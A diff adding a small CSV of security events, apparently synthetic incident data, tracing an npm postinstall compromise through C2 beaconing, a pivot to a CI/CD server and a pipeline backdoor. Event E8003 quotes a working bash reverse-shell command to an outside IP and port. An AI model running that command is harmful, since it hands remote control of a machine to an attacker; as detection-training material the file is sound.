@@ -1,0 +1,7 @@
+event_id,timestamp,event_type,user_id,device_id,ip_address,application,server_id,destination_ip,severity,description
+E8001,2026-10-07 15:30:10,LOGIN,USR108,DEV012,10.10.20.45,Okta SSO,,,low,"Developer login from engineering workstation DEV012"
+E8002,2026-10-07 15:35:20,PROCESS_EXECUTION,USR108,DEV012,10.10.20.45,CrowdStrike EDR,,45.154.255.89,critical,"Malicious postinstall script executed during npm install malicious-analytics-lib"
+E8003,2026-10-07 15:37:00,COMMAND_EXECUTION,USR108,DEV012,10.10.20.45,CrowdStrike EDR,,45.154.255.89,critical,"Reverse TCP shell spawned: /bin/bash -i >& /dev/tcp/45.154.255.89/4444 0>&1"
+E8004,2026-10-07 15:40:15,NETWORK_CONNECTION,USR108,DEV012,10.10.20.45,Palo Alto Firewall,,45.154.255.89,critical,"Persistent C2 beaconing heartbeat detected every 15 seconds to 45.154.255.89"
+E8005,2026-10-07 15:45:00,SERVER_ACCESS,USR108,DEV012,10.10.20.45,SSH Bastion,SRV007,,critical,"Infiltrated session pivoting to CI/CD Build-Server SRV007"
+E8006,2026-10-07 15:50:30,FILE_ACCESS,USR108,DEV012,10.10.20.45,GitLab CI,SRV007,,critical,"Injected malicious backdoor payload into production deployment pipeline"
